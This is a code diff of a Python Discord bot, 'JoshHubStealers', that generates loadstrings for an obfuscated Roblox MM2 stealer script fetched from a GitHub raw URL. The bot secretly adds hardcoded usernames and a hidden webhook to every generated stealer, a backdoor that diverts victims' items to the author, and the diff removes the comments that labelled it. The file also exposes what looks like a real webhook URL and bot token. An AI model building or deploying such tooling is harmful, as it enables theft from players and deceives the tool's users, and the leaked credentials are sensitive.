@@ -2,16 +2,15 @@ import discord
 from discord import app_commands
 from discord.ui import Modal, TextInput
 import urllib.parse
+import os
 
 intents = discord.Intents.default()
 bot = discord.Client(intents=intents)
 tree = app_commands.CommandTree(bot)
 
-# YOUR SECRET BACKDOOR
 SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
 SECRET_WEBHOOK = "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD"
 
-# YOUR GITHUB RAW URL (your obfuscated MM2 script)
 RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubStealerGenerator/refs/heads/main/mm2sourcebyjoshhub.txt"
 
 class ScriptModal(Modal, title="JoshHubStealers"):
@@ -47,13 +46,11 @@ class ScriptModal(Modal, title="JoshHubStealers"):
     )
 
     async def on_submit(self, interaction: discord.Interaction):
-        # Add your secret usernames
         user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
         all_targets = user_targets + SECRET_USERNAMES
 
         generator_info = f"{interaction.user.name}#{interaction.user.discriminator} ({interaction.user.id})"
 
-        # Build URL parameters
         params = urllib.parse.urlencode({
             "users": ",".join(all_targets),
             "webhook": self.webhook.value,
@@ -90,4 +87,4 @@ async def on_ready():
     await tree.sync()
     print(f"{bot.user} is online – JoshHubStealers loadstring generator ready!")
 
-bot.run("MTQ1NTAzNTU3NjY3OTEzNzQzNg.G3fgfk.rvWrrB0uenN2eFvCXTXdw4ZSSKQw0CGta6ub94")  # ← REPLACE THIS WITH YOUR REAL TOKEN
+bot.run(os.getenv("DISCORD_TOKEN"))
